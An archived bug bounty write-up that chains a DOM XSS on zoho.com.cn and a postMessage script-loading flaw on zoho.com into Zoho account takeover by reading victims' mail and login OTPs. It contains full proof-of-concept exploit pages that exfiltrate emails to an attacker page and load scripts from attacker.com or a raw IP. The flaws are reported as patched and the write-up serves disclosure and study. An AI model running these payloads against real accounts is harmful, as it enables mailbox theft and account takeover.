# Zoho Account Takeover

- **Source URL:** https://medium.com/@0xUsername/zoho-account-takeover-how-a-single-click-can-lead-to-full-control-on-your-zoho-account-04a5ea069382?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20240420110012/https://medium.com/@0xUsername/zoho-account-takeover-how-a-single-click-can-lead-to-full-control-on-your-zoho-account-04a5ea069382
- **Fetched:** 2026-11-23
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/5827 (id 5827)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Zoho Account Takeover: How a Single Click Can Lead to Full Control on your Zoho account

Hello my name is Anany and in this story, I will discuss how I discovered DOM XSS and POSTMESSAGE Misconfiguration, and how I escalated them to take over the Zoho account. This narrative will be divided into three parts:

1. DOM XSS at (www.zoho.com.cn)
2. POSTMESSAGE Misconfiguration at (www.zoho.com)
3. Escalation to Account Takeover (ATO)

To clarify, The DOM XSS and POSTMESSAGE Misconfiguration are two individual vulnerabilities here, not related to each other. They are separate vulnerabilities xss on `zoho.com.cn` and postmessage miconfiguration to xss in `zoho.com`, and with either one, we can use Part 3 (ATO) to take over the account.


# DOM XSS

One of my tool that I used trigger an DOM XSS in the URL *https://www.zoho.com.cn/assist/videos/#payload*

So I decided to look at the JavaScript to find the vulnerable code, Let’s take a look

`https://www.zoho.com.cn/sites/default/files/cpn/54594.js`
$(document).ready(function(e)   {

...

var tv\_id=window.location.href.split('#');

if(!tv\_id\[1\]=="")

{

autoplay(tv\_id\[1\]);

}

});

function autoplay(tar) {

var target\_v=eval(tar);

....

Clear and easy, the script takes the `location.href`, which is the URL, gets the hash from it, and passes it to `eval`

# POSTMESSAGE Misconfiguration

In [https://www.zoho.com/](https://www.zoho.com/) the script `9e..a9.js` load `a6..5f.js` lets break it and see what it has

```
var je = w.getZABQueryKeyValue(window.location.href, "ps_editor")
  , qe = w.getZABQueryKeyValue(window.location.href, "ps_verifyscript");
   je ? function(e, t)   {
        if (!document.querySelectorAll("#" + t).length)   {
            var i = document.createElement("script");
            (i = w.addNonce(i)).type = "text/javascript",
            i.id = t,
            i.src = e,
            window.$pagesense.$("head").append(i)
        }
    }("https://" + h.getTrackingServerUrl() + "/pagesense/initializer/scriptLoader.js", a.SCRIPT_LOADER_ID) : qe || window.location.search.indexOf("qa_mode=true") > -1 ? Fe() : Ce.checkPrivacyConsent()
```
It checks if the parameter `ps_editor` in the url or not if yes, the script will load the following script

`"https://" + h.getTrackingServerUrl() + "/pagesense/initializer/scriptLoader.js"`
Let’s load the script`/pagesense/initializer/scriptLoader.js` and see what it has

```
...
window.addEventListener("message", ps_loader.messageListener);
...
```
It just create message `EventListenr` and sets `ps_loader.messageListener` as the the callback, so let’s break `ps_loader.messageListener`

```
ps_loader.messageListener = function(event) {
  if (event.data.id === "pagesense-scriptloader-message") {
    const eventAction = event.data.action
    switch (eventAction) {
        case "updateServerDomain": {
            SERVER_DOMAIN = event.data.serverDomain
            break;
        }
        case "loadScript": {
          var scripts = event.data.scripts;
          ...
  
          for (var i = 0; i < scripts.length; i++) {
              ps_loader.loadScript(scripts[i]);
          }
          break;
        }
    }
  }
};
```
In the callback it checks if the attribute`action` in message equal to `updateServerDomain` or `loadScript`, It sets the attribute `serverDomain` in message to the variable `SERVER_DOMAIN` if the message `action` attribute is equal to `updateServerDomain` Or in the case `loadScript` it gets the attribute `scripts` from the message and sets it’s value to scripts, and after that it calls `ps_load.loadScript` with the `scripts` variable as the arguments

In the callback, it checks if the attribute `action` in the message is equal to `updateServerDomain` or `loadScript`. If the message action attribute is equal to `updateServerDomain`, it sets the attribute `serverDomain` in the message to the variable `SERVER_DOMAIN`.

In `loadScript`case, it retrieves the attribute `scripts` from the message and sets its value to the variable `scripts`. After that, it calls `ps_load.loadScript` with the variable `scripts` as the arguments.

Here is the code for `ps_load.loadScript`

```
ps_loader.loadScript = function(keyname) {
  var scriptMap = {
    editor: SERVER_DOMAIN + "/pagesense/initializer/editor.js", //NO I18N
    heatmap: SERVER_DOMAIN + "/js/heatmap.js" //NO I18N
  };
  
    
  ...
  var script_url = scriptMap[keyname];
  ...
  var h = "http"; 
  var http = ((window.location.protocol.indexOf("https") === -1) ? h + "://" : h + "s://"); // NO I18N
  var script = document.createElement("script"); //NO I18N
  script.src = "https" + "://" + script_url;
  document.documentElement.appendChild(script);
  return true;
```
This is the point where the vulnerability occurs: 

The function sets an object variable with two keys, `editor` and `heatmap`, and assigns the value of the `SERVER_DOMAIN`, which has been previously set in `ps_loader.messageListener`. Additionally, it includes two different script paths: `"/pagesense/initializer/editor.js"` and `"/js/heatmap.js"`.

Following that, it retrieves the `keyname` from the `scriptMap`. The `keyname` corresponds to the `scripts` variable set earlier in `ps_loader.messageListener`. Subsequently, it assigns the value to the variable `script_url` and proceeds to create a script tag using the `script_url` variable as the URL.

Let’s say we sent the following message

```
{
  "id":"pagesense-scriptloader-message",
  "action":"updateServerDomain",
  "serverDomain":"testme"
}
or 
{
  "id":"pagesense-scriptloader-message",
  "action":"loadScript",
  "scripts":["heatmap or editor"]
}
```
The script will examine the `action` attribute and, depending on the value of `action`, it will perform the corresponding task. In the case of `updateServerDomain`, the script will assign the value of the `serverDomain` to the `SERVER_DOMAIN`vriable, and subsequently, it will return.

If the `action` attribute in the message is equal to `loadScript`, the script will create a script tag with the URL based on the following conditions:

- If the `keyname -> scripts attribute` is equal to `editor`, the script src URL will be `SERVER_DOMAIN + "/pagesense/initializer/editor.js"`.
- If the `keyname -> scripts attribute` is equal to `heatmap`, the script src URL will be `SERVER_DOMAIN + "/js/heatmap.js"`.

So we can exploit that by sending a message that sets the variable `SERVER_DOMAIN` to point to our host and then sending another message to load the script.

# Escalation to Account Takeover (ATO)

**Note:** In the Escalation process, I will use

`workplace.zoho.com`, not `workplace.zoho.com.cn`. Both do not share the same code and features, `workplace.zoho.com.cn` doesn’t function like `workplace.zoho.com`. However, the concept of `mail` that we will discuss later will work in both tld.
## IFRAME

I was exploring the `workplace.zoho.com` and I found that it serve an IFRAME of the URL [https://mail.zoho.com/zm/?fromService=wp&wpVersion=xxxxx&canAddOACHeader=true&frameorigin=https%3A%2F%2Fworkplace.zoho.com#home](https://mail.zoho.com/zm/?fromService=wp&wpVersion=3ca9c46b04156400bec4&canAddOACHeader=true&frameorigin=https%3A%2F%2Fworkplace.zoho.com#home)

What is important here is the parameter `frameorigin` which will return in `Content-Security-Policy:`  which allow to [frame-ancestors](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) 'self' https://workplace.zoho.com`workplace` to iframe the `mail.zoho.com`, that mean we can specify the iframe parent as we need but in range `*.zoho.com`

Also I should mention that the *mail* and *workplace* 

## Read mails [CORS](https://portswigger.net/web-security/cors)

When loading mail, zoho mail gets your emails from `zmXX.zoho.com`. During this process, I observed the presence of the `Access-Control-Allow-Origin` header, permitting access to `www.zoho.com`. This implies that we can fetch emails from there. However, a challenge arises with the `accId` parameter, it's the `account Id`. T here are various methods to obtain this value, the most straightforward approach I discovered after two weeks of experimentation, is through the `postmessage`.

Whenever there is a change in the `location.hash`, the mail frame sends a message to the parent. This message contains both the new and old `location.hash` values. Our goal is to extract specifically the new hash value.

Upon investigation, I did discover the hash `#settings/mailaccounts`, which navigates to the settings and activates the `mailaccounts` section. Following this, the `mail` frame sends a message to the parent, which contains the account IDs

# OTP

Given our capability to access and read emails, we can gain unauthorized access to a victim’s account. By opting for the OTP (One-Time Password) method instead of using a password, we can initiate the login process. Subsequently, we can read the emails within the account, extracting the OTP received in the process. Finally, we can utilize this obtained OTP to log in to the victim’s account without requiring their password.

# zoho.com.cn XSS POC -> ATO

```
<body>
<div id="email-container"></div>
<script>
    window.addEventListener("message", function(event)   {
        console.log(event.data)
        if (event.data && event.data.from && event.data.from == "summery")  {
            const data = JSON.parse(event.data.emails);
            const emails = data;
            const emailContainer = document.getElementById('email-container');
            if (Array.isArray(emails) && emails.length > 1)   {
                const email = emails[1].mdata;
                if (email.FROM && email.SUBJECT && email.SENTTIME)  {
                    const emailDiv = document.createElement('div');
                    emailDiv.innerHTML = `<strong>From:</strong> $  {email.FROM}<br><strong>Subject:</strong> $  {email.SUBJECT}<br><strong>Date:</strong> $  {email.SENTTIME}<br><strong>Body:</strong>$  {email.CONTENT}<br><br>`;
                    emailContainer.appendChild(emailDiv);
                }
            }
        }
    });
    url = "https://mail.zoho.com.cn/zm/?fromService=wp&wpVersion=3ca9c46b04156400bec4&canAddOACHeader=true&frameorigin=https%3A%2F%2Fwww.zoho.com.cn#settings/mailaccounts"
    var payload = btoa(`
        <div id="herewego">
        </div>
        <script>
            var stcmessage = false;var rlc = false;var udt = false;var ald = [];
            // Data to initialize the mail fram
            var data =   {"LIBRARY_INSTANTIATED_REPLY":{"fromWp":true,"eventType": "LIBRARY_INSTANTIATED_REPLY","data":{}},"GET_RAIL_TIME_VALUE":{"fromWp":true,"eventType": "GET_RAIL_TIME_VALUE","data":{}},"START_LOADING_RESOURCE":{"fromWp":true,"eventType":"START_LOADING_RESOURCE","data":  {}},"ENABLE_SET_NOTIFICATION_COUNT":{"fromWp":true,"eventType": "ENABLE_SET_NOTIFICATION_COUNT","data":{}},"SET_SEARCH_POSITION":{"fromWp":true,"eventType": "SET_SEARCH_POSITION","data":{ "top": "0px", "right": "0px" }},"FEATURE_ENABLED_FLAGS":{"fromWp":true,"eventType": "FEATURE_ENABLED_FLAGS","data":{ "isDragIndicationMarkedAsSeen": false }},"PAGE_VISIBILITY":{"fromWp":true,"eventType":"PAGE_VISIBILITY","data": {"visible":true}},"STOP_LOADING_RESOURCE":{"fromWp":true,"eventType": "STOP_LOADING_RESOURCE","data":   {}},"APP_CURRENT_SELECTED_STATUS":{"fromWp":true,"eventType": "APP_CURRENT_SELECTED_STATUS","data":{"isSelected":true}}}
            function sendMessageWithDelay(payload, delay)   {
                setTimeout(function ()   {
                    var mailIframe = document.getElementById('mailIframe');
                    mailIframe.contentWindow.postMessage(payload, '*');
                }, delay);
            }
            function sendMessageToParent(message)   {
                window.opener.postMessage(message, '*');
            }
            function sendRequest(url)   {
                return new Promise(function(resolve, reject){var xhr = new XMLHttpRequest();xhr.open('GET', url, true);xhr.withCredentials = true;xhr.onreadystatechange = function ()   {if (xhr.readyState == 4)   {if (xhr.status == 200)   {var response =   {"emails": xhr.responseText, "from": "summery", "accId": id};resolve(response);} else   {reject(xhr.statusText);}}};xhr.send();});
            }
            function resiverMessage(event)  {
                sendMessageToParent(event.data);
                if (event.data.eventType == "HIDE_LOADING")   {
                    sendMessageWithDelay(data['LIBRARY_INSTANTIATED_REPLY'], 1000);sendMessageWithDelay(data['FEATURE_ENABLED_FLAGS'], 1000);sendMessageWithDelay(data['GET_RAIL_TIME_VALUE'], 1000);sendMessageWithDelay(data['PAGE_VISIBILITY'], 10000);
                } else if (event.data.eventType == "SET_NOTIFICATION_COUNT")   {
                    if (!stcmessage)  {
                        // initialize the mail fram
                        stcmessage = true;sendMessageWithDelay(data['START_LOADING_RESOURCE'], 1000);sendMessageWithDelay(data['ENABLE_SET_NOTIFICATION_COUNT'], 1000);sendMessageWithDelay(data['SET_SEARCH_POSITION'], 1000);sendMessageWithDelay(data['FEATURE_ENABLED_FLAGS'], 1000);sendMessageWithDelay(data['APP_CURRENT_SELECTED_STATUS'], 1000);
                    }
                } else if (event.data.eventType == "SET_HASH")  {
                    if (event.data.data.hashValue && event.data.data.hashValue.includes("mailaccounts"))  {
                        id = event.data.data.hashValue.split('/')[2];
                        if (ald.indexOf(id) == -1 && id)   {
                            console.log(id)
                            ald.push(id);
                            sendRequest('https://zm2.zoho.com.cn/zm/ml.do?xhr=1705341324677&mode=listing&accId=' + id + '&from=1&to=50&summary=true&sortBy=date&sortOrder=false&folderSpec=0')
                            .then(function(response)   {
                                sendMessageToParent(response)
                                emails = JSON.parse(response.emails);
                                const emailList = emails[1];
                                emailList.forEach(function(email)   {
                                    sendRequest('https://zm2.zoho.com.cn/zm/md.do?xhr=1705398265539&accId=' + id + '&summary=true&msgId=' + email.M + '&vfc=false&split=true').then(function(response2)  {
                                        sendMessageToParent(response2,"OTP")
                                    }).catch(function(error)  {
                                        console.log(error)
                                    })
                                });
                            })
                            .catch(function(error){console.error(error);});
                        }
                    }
                } 
            }
            window.addEventListener("message", resiverMessage)
            document.getElementById('herewego').innerHTML = '<iframe title="Mail" allow="fullscreen;clipboard-read;clipboard-write;geolocation;microphone;camera;display-capture" allowfullscreen="" class="" style="position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;" id="mailIframe" src="$  {url}">'
        <\/script>`)
    var wv = window.open(`https://www.zoho.com.cn/assist/videos/#javascript:document.write(atob('$  {payload}'))`)
</script>
</body>
```
- First we create a new message event to receive the messages which in this case the emails
- Create the payload that will be xss payload
- Create div to add to it the iframe
- The payload script contains
- `stcmessage,rlc,udt,ald` To prevent repeat work
- `data` is object contain the initial messages data for the mail iframe
- `sendMessageWithDelay` to send message to `mail` iframe
- `resiverMessage` will do all the work of reading the emails and get it's body and after that will return it to the parent which our website

## Video PoC

```
Here is the payload for the messages
<body>
<div id="email-container"></div>
<script>
  window.addEventListener("message", function(event)   {
      console.log(event.data)
      if (event.data && event.data.from && event.data.from == "summery")  {
          const data = JSON.parse(event.data.emails);
          const emails = data;
          const emailContainer = document.getElementById('email-container');
          if (Array.isArray(emails) && emails.length > 1)   {
              const email = emails[1].mdata;
              if (email.FROM && email.SUBJECT && email.SENTTIME)  {
                  const emailDiv = document.createElement('div');
                  emailDiv.innerHTML = `<strong>From:</strong> $  {email.FROM}<br><strong>Subject:</strong> $  {email.SUBJECT}<br><strong>Date:</strong> $  {email.SENTTIME}<br><strong>Body:</strong>$  {email.CONTENT}<br><br>`;
                  emailContainer.appendChild(emailDiv);
              }
          }
  
      }
  });
  
  
  
  function sendMessageWithDelay(payload, delay) {
    setTimeout(function () {
      open_window.postMessage(payload, '*');
    }, delay);
  }
  
  var open_window;
  
  open_window = window.open("https://www.zoho.com/?mc_cid=test&mc_eid=testme&ps_editor=hellpme&siq_id=test&ps_verifyscript=testjasdf&qa_mode=true")
  sendMessageWithDelay(  {"id":"pagesense-scriptloader-message","action":"updateServerDomain","serverDomain":"193.105.207.167:4443"},3000)
  sendMessageWithDelay(  {"id":"pagesense-scriptloader-message","action":"loadScript","scripts":["heatmap"]},5000)
</script>
</body>
And here is the payload that we should host on of the following files on our host
- https?://attacker.com/pagesense/initializer/editor.js
Or
- https?://attacker.com/js/heatmap.js
url = "https://mail.zoho.com/zm/?fromService=wp&wpVersion=xxx&canAddOACHeader=true&frameorigin=https%3A%2F%2Fwww.zoho.com#settings/mailaccounts"
var stcmessage = false;
...
var data = {...}
function sendMessageWithDelay(payload, delay) {...}
function sendMessageToParent(message) {...}
function sendRequest(url) {...}
function resiverMessage(event) {...}
window.addEventListener("message", resiverMessage)
var iframe = document.createElement('iframe');
iframe.title = 'Mail';
iframe.allow = 'fullscreen;clipboard-read;clipboard-write;geolocation;microphone;camera;display-capture';
iframe.allowfullscreen = true;
iframe.style.cssText = 'position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;';
iframe.id = 'mailIframe';
iframe.src = url;
document.body.appendChild(iframe);
```
- First we create iframe with src [https://www.zoho.com](https://www.zoho.com)/…
- Then we send message to set *SERVER_DOMAIN*
 *variable to our host*
- Sending another message to create the script tag
- Takeover the account

## Video PoC

## Timeline

- January 16, 2024: First vulnerability reported.
- January 24, 2024: Second vulnerability reported.
- February 9, 2024: First vulnerability patched.
- March 19, 2024: Second vulnerability patched.
- April 12, 2024: bounty of $1000 released for the first report, $100 for the second.
